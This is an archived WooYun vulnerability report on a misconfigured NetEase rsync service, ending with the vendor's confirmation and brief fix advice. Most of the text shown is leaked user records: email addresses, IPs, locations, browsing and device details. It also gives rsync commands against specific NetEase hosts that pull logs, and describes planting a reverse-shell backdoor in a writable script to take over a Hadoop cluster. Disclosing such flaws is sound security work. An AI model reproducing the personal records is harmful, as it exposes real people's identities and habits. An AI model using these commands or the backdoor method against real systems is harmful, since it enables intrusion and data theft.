+zzng_007@163.com	2013-11-23 13:49:43	6c8e4af9a493f37fdb3a8796384f36c4	http%3A//sports.163.com/13/1123/12/9EC9GF3H00051C89.html%3Ff%3DresysBvalid2%23www_resys	山东省	聊城市	zzng_007@163.com<br />
+zznissanyw@126.com	2013-11-23 20:57:51	e60fb931cdcb90ec9445803020a97521	http%3A//ent.163.com/13/1123/18/9ECT6FCA00034SS1.html%3Ff%3DresysBvalid6%23www_resys	吉林省	通化市	zznissanyw@126.com<br />
+zznissanyw@126.com	2013-11-23 10:13:28	e60fb931cdcb90ec9445803020a97521	http%3A//ent.163.com/13/1123/05/9EBGAJ1F00031H2L.html%3Ff%3DresysBvalid6%23www_resys	河南省	郑州市	zznissanyw@126.com<br />
+zznissanyw@126.com	2013-11-23 20:56:26	e60fb931cdcb90ec9445803020a97521	http%3A//ent.163.com/13/1123/12/9EC8IMRI00031H2L.html%3Ff%3DresysBvalid5%23www_resys	吉林省	通化市	zznissanyw@126.com<br />
+zznjbjb@163.com	2013-11-23 19:00:12	001c89fbea36b1a004c4c791297077a2	http%3A//ent.163.com/13/1123/16/9ECKAB7000034JAU.html%3Ff%3DresysBvalid2%23www_resys	河南省	郑州市	zznjbjb@163.com<br />
+zznn04@163.com	2013-11-23 22:14:00	baa06371261a869bc6a695f086c09827	http%3A//ent.163.com/13/1123/19/9ECUCDD100031H2L.html%3Ff%3DresysBvalid1%23www_resys	北京市		zznn04@163.com<br />
+zznn04@163.com	2013-11-23 22:14:20	baa06371261a869bc6a695f086c09827	http%3A//ent.163.com/13/1123/17/9ECQCPM200031H2L.html%3Ff%3DresysBvalid2%23www_resys	北京市		zznn04@163.com<br />
+zznn1116@163.com	2013-11-23 23:45:43	98ff2da274526b39b43cb62e1a60e6d5	http%3A//news.163.com/13/1123/21/9ED584FJ00011229.html%3Ff%3DresysBvalid1%23www_resys	云南省		zznn1116@163.com<br />
+zznn1116@163.com	2013-11-23 23:46:18	98ff2da274526b39b43cb62e1a60e6d5	http%3A//news.163.com/13/1123/16/9ECLANKA00011229.html%3Ff%3DresysBvalid4%23www_resys	云南省		zznn1116@163.com<br />
+zznn1116@163.com	2013-11-23 18:13:40	98ff2da274526b39b43cb62e1a60e6d5	http%3A//sports.163.com/13/1123/13/9ECB6N8C00051C89.html%3Ff%3DresysBvalid2%23www_resys	云南省		zznn1116@163.com<br />
+zznn_ll@163.com	2013-11-23 23:18:24	54547cd9346af01602c88f193cdad15c	http%3A//sports.163.com/13/1123/20/9ED524DU00051C89.html%3Ff%3DresysAvalid1%23www_resys	广东省		zznn_ll@163.com<br />
+zznn_ll@163.com	2013-11-23 23:21:05	54547cd9346af01602c88f193cdad15c	http%3A//sports.163.com/13/1123/21/9ED6SGO200051C89.html%3Ff%3DresysAvalid1%23www_resys	广东省		zznn_ll@163.com<br />
+zznnmm@163.com	2013-11-23 21:36:44	10a45d4d5aea3dd8b0fb3d819d8c582c	http%3A//sports.163.com/13/1123/20/9ED4B0TO00051C89.html%3Ff%3DresysBvalid1%23www_resys	四川省	成都市	zznnmm@163.com<br />
+zznnmm@163.com	2013-11-23 21:36:54	10a45d4d5aea3dd8b0fb3d819d8c582c	http%3A//sports.163.com/13/1123/20/9ED524DU00051C89.html%3Ff%3DresysBvalid1%23www_resys	四川省	成都市	zznnmm@163.com<br />
+zznonogz@163.com	2013-11-23 10:18:09	7ce2f6bb025580805f1d26f154bd9c12	http%3A//news.163.com/photoview/00AO0001/40288.html%3Ff%3DresysAvalid4%23www_resys	浙江省	丽水市	zznonogz@163.com<br />
+zznxxzj@163.com	2013-11-23 22:00:40	c822c7e70702f8e43cb41f8b18aa97bf	http%3A//sports.163.com/13/1123/20/9ED4B0TO00051C89.html%3Ff%3DresysBvalid1%23www_resys	天津市		zznxxzj@163.com<br />
+zznxxzj@163.com	2013-11-23 22:05:09	c822c7e70702f8e43cb41f8b18aa97bf	http%3A//sports.163.com/13/1123/21/9ED5O8RD00051C89.html%3Ff%3DresysBvalid2%23www_resys	天津市		zznxxzj@163.com<br />
+zznxxzj@163.com	2013-11-23 22:02:12	c822c7e70702f8e43cb41f8b18aa97bf	http%3A//sports.163.com/13/1123/20/9ED524DU00051C89.html%3Ff%3DresysBvalid1%23www_resys	天津市		zznxxzj@163.com<br />
+zznxxzj@163.com	2013-11-23 22:03:07	c822c7e70702f8e43cb41f8b18aa97bf	http%3A//v.163.com/zixun/V8GAM8GTF/V9D1165PG.html%3Ff%3DresysBcold1%23www_resys	天津市		zznxxzj@163.com<br />
+zznxxzj@163.com	2013-11-23 22:06:05	c822c7e70702f8e43cb41f8b18aa97bf	http%3A//sports.163.com/13/1123/13/9ECB6N8C00051C89.html%3Ff%3DresysBvalid6%23www_resys	天津市		zznxxzj@163.com<br />
+zzontheway@126.com	2013-11-23 00:02:35	a36061e65c77ccd850bd045c3a925b76	http%3A//sports.163.com/13/1122/22/9EAO5NV600051C8V.html%3Ff%3DresysAvalid1%23www_resys	广东省	广州市	zzontheway@126.com<br />
+zzontheway@126.com	2013-11-23 09:55:51	a36061e65c77ccd850bd045c3a925b76	http%3A//ent.163.com/13/1123/08/9EBOL7CP00031H2L.html%3Ff%3DresysAvalid1%23www_resys	广东省	广州市	zzontheway@126.com<br />
+zzos80@163.com	2013-11-23 21:15:55	3c1cdcdfc310a2e8c37155347398ce78	http%3A//news.163.com/13/1123/16/9ECLD96500011229.html%3Ff%3DresysBvalid1%23www_resys	北京市		zzos80@163.com<br />
+zzoutdoor@126.com	2013-11-23 09:41:01	cde0d93182e7562852e725031d490a20	http%3A//ent.163.com/photoview/00AJ0003/515184.html%3Ff%3DresysBvalid4%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 09:36:28	cde0d93182e7562852e725031d490a20	http%3A//v.163.com/zixun/V8GAM8GTF/V9D4DTHHE.html%3Ff%3DresysBvalid1%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 13:26:07	cde0d93182e7562852e725031d490a20	http%3A//v.163.com/zixun/V8GAM8GTF/V9C800CAF.html%3Ff%3DresysBvalid4%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 13:25:52	cde0d93182e7562852e725031d490a20	http%3A//ent.163.com/13/1123/09/9EBSDCHO00031H2L.html%3Ff%3DresysBvalid4%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 13:24:39	cde0d93182e7562852e725031d490a20	http%3A//news.163.com/13/1123/09/9EBSKF8A00011229.html%3Ff%3DresysBvalid2%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 09:37:04	cde0d93182e7562852e725031d490a20	http%3A//v.163.com/zixun/V8GAM9FF2/V9D11DS7F.html%3Ff%3DresysBvalid2%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 09:42:15	cde0d93182e7562852e725031d490a20	http%3A//ent.163.com/13/1123/08/9EBOL7CP00031H2L.html%3Ff%3DresysBvalid6%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 22:54:42	cde0d93182e7562852e725031d490a20	http%3A//ent.163.com/13/1123/19/9ECUCDD100031H2L.html%3Ff%3DresysBvalid1%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 09:40:37	cde0d93182e7562852e725031d490a20	http%3A//v.163.com/zixun/V8GAMA366/V9CSB09O9.html%3Ff%3DresysBvalid3%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 23:00:04	cde0d93182e7562852e725031d490a20	http%3A//v.163.com/zixun/V8GAMA366/V9D3JEEJ6.html%3Ff%3DresysBvalid1%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 23:01:33	cde0d93182e7562852e725031d490a20	http%3A//news.163.com/13/1123/16/9ECKEMVV0001124J.html%3Ff%3DresysBvalid4%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzoutdoor@126.com	2013-11-23 23:02:10	cde0d93182e7562852e725031d490a20	http%3A//ent.163.com/13/1123/21/9ED58E3C00034SS1.html%3Ff%3DresysBvalid5%23www_resys	湖南省	株洲市	zzoutdoor@126.com<br />
+zzp0001@163.com	2013-11-23 22:16:59	02e7048ad5ed44c81eabb841f63c5254	http%3A//news.163.com/13/1123/17/9ECQ924H00011229.html%3Ff%3DresysBvalid1%23www_resys	河北省	廊坊市	zzp0001@163.com<br />
+zzp0001@163.com	2013-11-23 22:18:26	02e7048ad5ed44c81eabb841f63c5254	http%3A//v.163.com/zixun/V8GAM8GTF/V9D1165PG.html%3Ff%3DresysBvalid1%23www_resys	河北省	廊坊市	zzp0001@163.com<br />
+zzp008668@163.com	2013-11-23 11:20:09	b5360a2a6cb2397caeaf174a953a82b1	http%3A//mobile.163.com/13/1123/09/9EBU40OL0011179O.html%3Ff%3DresysBvalid2%23www_resys	河北省	廊坊市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 18:23:22	b5360a2a6cb2397caeaf174a953a82b1	http%3A//news.163.com/13/1123/13/9ECB2SQK0001121M.html%3Ff%3DresysBvalid1%23www_resys	河北省	廊坊市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 11:20:26	b5360a2a6cb2397caeaf174a953a82b1	http%3A//mobile.163.com/13/1123/10/9EC0TA310011179O.html%3Ff%3DresysBvalid3%23www_resys	河北省	廊坊市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 00:44:26	b5360a2a6cb2397caeaf174a953a82b1	http%3A//mobile.163.com/13/1122/14/9E9R92PK001117A8.html%3Ff%3DresysBvalid1%23www_resys	广东省	佛山市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 09:24:43	b5360a2a6cb2397caeaf174a953a82b1	http%3A//news.163.com/13/1123/05/9EBG59T900011229.html%3Ff%3DresysBvalid2%23www_resys	河北省	廊坊市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 18:28:21	b5360a2a6cb2397caeaf174a953a82b1	http%3A//news.163.com/13/1123/07/9EBNPQVM00011229.html%3Ff%3DresysBvalid5%23www_resys	河北省	廊坊市	zzp008668@163.com<br />
+zzp008668@163.com	2013-11-23 18:24:32	b5360a2a6cb2397caeaf174a953a82b1	http%3A//news.163.com/13/1123/16/9ECLANKA00011229.html%3Ff%3DresysBvalid2%23www_resys	河北省	廊坊市	zzp008668@163.com</code></pre><p class='detail'><br />
+<br />
+#6 你的喜好倾向，你的喜好都会被泄露(比如女性频道，仅仅举例……)<br />
+<br />
+</p><pre><code>rsync 123.58.176.95::log88/231/lady/20131125/lady_20131125_01.log.gz<br />
+2013-11-25 01:00:00     cc020640927a6b2e75409d636471a8a6        0       0       0       0       http://lady.163.com/photoview/3QKL0026/55310.html?from=tj_day#p=6UO3Q0BK43A90026      星八客76：这些情侣分手又复合？_网易女人          Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1 SV1) 1440x900        zh-cn   32-bit  1385308449       119.115.130.34  辽宁省  葫芦岛市        联通            10.0<br />
+2013-11-25 01:00:00     cc73597ae617baafddf3a3690fb51e01        0       0       0       0       http://lady.163.com/photoview/513O0026/55267.html#p=9E78O2UJ513O0026      盘点拒绝参加旧爱婚礼的明星_网易女人          Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1     1440x900zh-cn    32-bit  1385271715      118.26.176.66   北京市          联通    liujihao199771@163.com   11.6 r602<br />
+2013-11-25 01:00:00     2de325f197eecc8294e4141115fbebc6        0       0       0       0       http://fashion.163.com/13/1124/20/9EFMUAQ700264M5O.html?f=ArticlePhotoset#p=9EFMMTIF43AJ0026  轻松出名模式都有猫腻 揭秘娱圈现实版&quot;继承者&quot;_网易女人               Mozilla/5.0 (iPad CPU OS 7_0_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A501 Safari/9537.53 768x1024        zh-cn   32-bit  1385283601      125.86.237.4    重庆市          电信<br />
+2013-11-25 01:00:00     4ccb15b290478cf480f1743c56496514        0       0       0       0       http://lady.163.com/photoview/3QKL0026/55091.html?from=tj_xgtj#p=9E2A9I6G3QKL0026     星八客75：同期出道 明星星途两重天_网易女人         Mozilla/4.0 (compatible MSIE 8.0 Windows NT 5.1 Trident/4.0 QQDownload 718 GTB7.4 .NET CLR 2.0.50727 .NET CLR 3.0.4506.2152 .NET CLR 3.5.30729)  1536x864        zh-cn   32-bit  1385286866      49.115.230.99   新疆            电信            10.0<br />
+2013-11-25 01:00:00     6f1c2fc371d6e4e1fd07aae99d6b78a7        0       0       0       0       http://lady.163.com/photoview/4CJ80026/55106.html#p=9E2JTTU44CJ80026      同龄女星大PK 保养真的很重要！_网易女人             Mozilla/4.0 (compatible MSIE 8.0 Windows NT 5.1 Trident/4.0 GTB7.4) 1152x864        zh-cn   32-bit  1385311809       111.123.193.230 贵州省  铜仁地区        电信            10.0<br />
+2013-11-25 01:00:00     4109abc29628264c48bbd4dfbb52fd2a        0       1       0       0       http://fashion.163.com/photoview/43AJ0026/55063.html?wykj#p=9E17VT2L43AJ0026    港台大叔偏爱找内地嫩妻_网易女人              Mozilla/4.0 (compatible MSIE 6.0 Windows NT 5.1 SV1 .NET CLR 2.0.50727 .NET CLR 3.0.04506.30)      1024x768zh-cn    32-bit  1385312437      220.175.154.158 江西省  九江市  电信            10.0<br />
+2013-11-25 01:00:00     6c20de8fc64ebdc8549b94ff3830e974        0       0       0       0       http://lady.163.com/photoview/4CJ80026/55106.html#p=9E2JMSAV4CJ80026      同龄女星大PK 保养真的很重要！_网易女人             Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1     1366x768 zh-cn   32-bit  1385283011      110.255.27.128  河北省  秦皇岛市        联通    hl_haoli@163.com         11.6 r602<br />
+2013-11-25 01:00:00     1c1211864cd6611126a751147f012086        0       0       0       0       http://lady.163.com/photoview/4CJ80026/55106.html#p=9E2FU0374CJ80026      同龄女星大PK 保养真的很重要！_网易女人             Mozilla/5.0 (Windows NT 6.1 WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36     2560x1440       zh-cn   32-bit  1385283443      123.120.229.216 北京市          联通    xinghe09yingyu@126.com   11.9 r900<br />
+2013-11-25 01:00:00     f26f4968d85c8a7a8c87820be746633e        0       0       0       0       http://lady.163.com/photoview/4CJ80026/55106.html#p=9E2JTTU44CJ80026      同龄女星大PK 保养真的很重要！_网易女人             Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1     1440x900 zh-cn   32-bit  1385283221      183.37.9.141    广东省  深圳市  电信    liujingit@163.com        11.6 r602<br />
+2013-11-25 01:00:00     c122c5b73d4309a8a5e2c119ab8ef2b2        0       0       0       0       http://lady.163.com/photoview/4CJ80026/55106.html#p=9E2JFFF94CJ80026      同龄女星大PK 保养真的很重要！_网易女人             Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1     1280x1024        zh-cn   32-bit  1385283174      58.40.19.65     上海市          电信             11.6 r602</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+#7 对rsyncd服务器上的资源有可写权限<br />
+<br />
+在本地修改rsyncarticle.sh后，加入反弹后门脚本，再上传，即可获取到网易集中日志管理系统hadoop集群系统权限<br />
+<br />
+</p><pre><code>rsync 123.58.176.101::article/rsyncarticle.sh -av<br />
+receiving incremental file list<br />
+-rwxr--r--         357 2013/07/29 09:01:48 rsyncarticle.sh<br />
+sent 29 bytes  received 86 bytes  76.67 bytes/sec<br />
+total size is 357  speedup is 3.10<br />
+<br />
+~# cat rsyncarticle.sh <br />
+#!/bin/bash<br />
+for day in `cat /home/zoubo/xx`;do<br />
+        echo $day,&quot;/home/hduser/recommend/origin/backup/article/article.${day:0:4}-${day:4:2}-${day:6:2}.gz&quot;<br />
+        #rsync /home/hduser/recommend/origin/backup/article/article.${day:0:4}-${day:4:2}-${day:6:2}.gz  <br />
+done<br />
+#rsync /home/hduser/recommend/origin/backup/article/article.${day:0:4}-${day:4:2}-${day:6:2}.gz</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>rsync 123.58.176.101::article/<br />
+-rw-r--r--    16996582 2013/11/18 00:50:24 article.2013-11-17_1.gz<br />
+-rw-r--r--    55667998 2013/11/19 00:51:09 article.2013-11-18_1.gz<br />
+-rw-r--r--    57016622 2013/11/20 00:51:14 article.2013-11-19_1.gz<br />
+-rw-r--r--    56180292 2013/11/21 00:51:10 article.2013-11-20_1.gz<br />
+-rw-r--r--    58170157 2013/11/22 00:51:07 article.2013-11-21_1.gz<br />
+-rw-r--r--    57800916 2013/11/23 00:51:11 article.2013-11-22_1.gz<br />
+-rw-r--r--    22566374 2013/11/24 00:50:29 article.2013-11-23_1.gz<br />
+-rw-r--r--    18385618 2013/11/25 00:50:25 article.2013-11-24_1.gz<br />
+-rw-r--r--    53793528 2013/11/26 00:51:14 article.2013-11-25_1.gz<br />
+-rw-r--r--    67105441 2013/09/16 11:52:54 article.bak<br />
+-rw-------      376832 2013/10/30 18:37:28 core.21077<br />
+-rw-r--r--  6396056747 2013/11/25 09:16:58 news_userpref<br />
+-rw-r--r--          58 2013/10/12 14:30:48 note<br />
+-rwxr--r--         169 2013/10/12 14:32:01 rename.sh<br />
+-rwxr--r--         357 2013/07/29 09:01:48 rsyncarticle.sh<br />
+-rw-r--r--    15355396 2013/09/23 17:34:01 totalpicuniq.gz<br />
+-rw-r--r--         516 2013/11/20 11:59:33 userinterest<br />
+-rw-r--r--         498 2013/11/20 12:52:26 userinterestfirst<br />
+drwxr-xr-x        4096 2013/07/29 12:55:09 2012</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">#1 网络边界需要认真对待。<br />
+<br />
+#2 杜绝为了方便而造成的不必要的信息泄露。<br />
+<br />
+#3 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044099" title="网易某服务配置不当 导致2.2亿活跃用户敏感信息泄露">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2013-11-27 18:38</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对网易的关注，我们的确发现有漏洞存在，数据为近期用户日常的访问记录日志，并未对用户的数据安全造成重大危害，目前漏洞已经修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44099";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
